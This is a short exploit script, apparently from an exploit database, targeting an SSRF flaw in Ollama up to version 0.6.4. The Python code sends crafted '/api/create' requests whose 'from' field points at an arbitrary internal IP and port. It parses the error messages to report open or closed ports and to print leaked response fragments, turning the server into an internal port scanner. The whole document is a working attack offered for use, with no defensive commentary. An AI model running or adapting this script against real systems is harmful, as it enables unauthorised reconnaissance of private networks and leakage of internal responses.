# Exploit Title: ollama 0.6.4 - SSRF
# Date: 2025-04-03
# Exploit Author: sud0
# Vendor Homepage: https://ollama.com/
# Software Link: https://github.com/ollama/ollama/releases
# Version: <=0.6.4
# Tested on: CentOS 8

import argparse
import requests
import json
from urllib.parse import urljoin

def check_port(api_base, ip, port):
    api_endpoint = api_base.rstrip('/') + '/api/create'

    model_path = "mynp/model:1.1"
    target_url = f"https://{ip}:{port}/{model_path}"
    payload = {
        "model": "mario",
        "from": target_url,
        "system": "You are Mario from Super Mario Bros."
    }

    try:
        response = requests.post(api_endpoint, json=payload, timeout=10, stream=True)
        response.raise_for_status()

        for line in response.iter_lines():
            if line:
                try:
                    json_data = json.loads(line.decode('utf-8'))
                    if "error" in json_data and "pull model manifest" in json_data["error"]:
                        error_msg = json_data["error"]
                        model_path_list = model_path.split(":", 2)
                        model_path_prefix = model_path_list[0]
                        model_path_suffix = model_path_list[1]
                        model_path_with_manifests = f"{model_path_prefix}/manifests/{model_path_suffix}"
                        if model_path_with_manifests in error_msg:
                            path_start = error_msg.find(model_path_with_manifests)
                            result = error_msg[path_start+len(model_path_with_manifests)+3:] if path_start != -1 else ""
                            print(f"Raw Response: {result}")
                        if "connection refused" in error_msg.lower():
                            print(f"[!] Port Closed - {ip}:{port}")
                        else:
                            print(f"[+] Port Maybe Open - {ip}:{port}")
                        return
                except json.JSONDecodeError:
                    continue

        print(f"[?] Unkown Status - {ip}:{port}")

    except requests.exceptions.RequestException as e:
        print(f"[x] Execute failed: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ollama ssrf - port scan")
    parser.add_argument("--api", required=True, help="Ollama api url")
    parser.add_argument("-i", "--ip", required=True, help="target ip")
    parser.add_argument("-p", "--port", required=True, type=int, help="target port")
    args = parser.parse_args()

    check_port(args.api, args.ip, args.port)